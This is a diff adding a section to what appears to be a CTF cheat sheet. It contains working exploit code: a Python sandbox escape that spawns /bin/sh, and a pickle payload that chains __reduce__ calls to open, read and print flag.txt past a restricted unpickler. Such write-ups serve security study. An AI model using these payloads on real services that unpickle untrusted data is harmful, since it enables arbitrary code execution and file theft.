@@ -39,6 +39,42 @@ import statistics
 statistics.random._os._execvpe("/bin/sh", [], {})
 ```
 
+### Pickle
+
+[Source](https://gist.github.com/toblu302/364c3b474c4148295fdee9bd0207e758)
+
+```python
+#!/usr/bin/env python3
+
+# From the error message we can see that only __main__, __buitin__ and copyreg are allowed
+# __builtin__.eval and __builtin__.exec are banned as well
+# We can just open and print the flag.txt by using __builin__.open, followed by readline and print
+# This sequence of calls is constructed below by using multiple objects and the pickle __reduce__ interface
+
+import base64
+import builtins
+import pickle
+
+class FlagObjPickle:
+    def __reduce__(self):
+        return builtins.open, ("./flag.txt",)
+    def readlines(self):
+        pass
+
+class ReadFlagPickle:
+    def __reduce__(self):
+        return FlagObjPickle().readlines, tuple()
+
+class PrintFlagPickle:
+    def __reduce__(self):
+        return builtins.print, (ReadFlagPickle(),)
+
+a = PrintFlagPickle()
+pickled = pickle.dumps(a, 0)
+```
+
+Any callable in the target's namespace can be called with \(almost\) arbitrary parameters by pickling a class which implements `__reduce__`. Return the callable and a tuple of arguments. See above for a technique to chain as well.
+
 ## Docker
 
 * [deepce](https://github.com/stealthcopter/deepce/), a vulnerability scanner.  
